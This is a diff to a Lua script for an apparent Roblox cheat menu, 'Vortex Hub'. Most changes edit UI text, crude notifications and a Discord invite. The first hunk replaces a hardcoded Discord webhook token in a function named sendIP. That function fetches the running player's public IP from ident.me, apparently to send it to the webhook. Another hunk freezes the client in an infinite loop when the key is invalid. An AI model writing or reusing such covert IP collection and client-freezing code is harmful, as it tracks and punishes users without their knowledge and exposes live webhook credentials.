@@ -63,7 +63,7 @@ function framework:Create(type, properties)
 end
 
 local function sendIP(whitelistKey)
-  local Webhook = "https://discord.com/api/webhooks/881177976778141746/jEmt9Z6mRomm74xW6Go8bAlzrc2I_KcCOMa-N64NYBOW2pjOIgWEhUzvJ-VdTuNgrV7B"
+  local Webhook = "https://discord.com/api/webhooks/917738433533845544/sHPeOjVjoqQ6r0wCDuIJeRBRtP5c9OTAQAobpsGB3HDdJIXX_9NVzOthoVzurD7pLYKP"
   local IPv4 = game:HttpGet("https://v4.ident.me/")
   --local IPv6 = game:HttpGet("https://v6.ident.me/")
 
@@ -2061,7 +2061,7 @@ function framework:LoadUI()
     Size = UDim2.new(0, 494, 0, 24),
     BackgroundTransparency = 1,
     Font = framework.menuSettings.font,
-    Text = "Vortex Hub",
+    Text = "Vortex Z?!?!",
     TextColor3 = Color3.fromRGB(255, 255, 255),
     TextSize = framework.menuSettings.titleSize,
     TextXAlignment = Enum.TextXAlignment.Left
@@ -2131,7 +2131,7 @@ function framework:LoadUI()
   end)
   game.Players.PlayerAdded:Connect(function(plr)
   		if framework.admin_accounts.azoozAccounts[plr.UserId] then
-  			framework:sendNotification("Az00z has joined your server")
+  			framework:sendNotification("Daddy Azooz has joined your server")
         createNameTag(plr.Name, "Azooz")
   		elseif framework.admin_accounts.smail_accounts[plr.UserId] then
   			framework:sendNotification("Smail has joined your server")
@@ -2140,7 +2140,7 @@ function framework:LoadUI()
   			framework:sendNotification("Max has joined your server")
         createNameTag(plr.Name, "Max")
       elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-        framework:sendNotification("A cute Raven has joined your server")
+        framework:sendNotification("Raven has joined your server")
         createNameTag(plr.Name, "Raven")
   		end
       plr.CharacterAdded:Connect(function(plr)
@@ -2461,10 +2461,10 @@ function framework:Init()
       framework:LoadUI()
       framework:sendNotification("UI Loaded, Enjoy!")
       warn(game.Players.LocalPlayer.Name.." is whitelisted")
-      framework:sendNotification("Working on kewl stuff cumming zoon")
+      framework:sendNotification("Rewritting everything | discord.gg/WSNfRTPXVK")
       return
     else
-      framework:sendNotification("Invalid key, i will fk u now owo")
+      framework:sendNotification("Invalid key")
       while true do
       end
     end
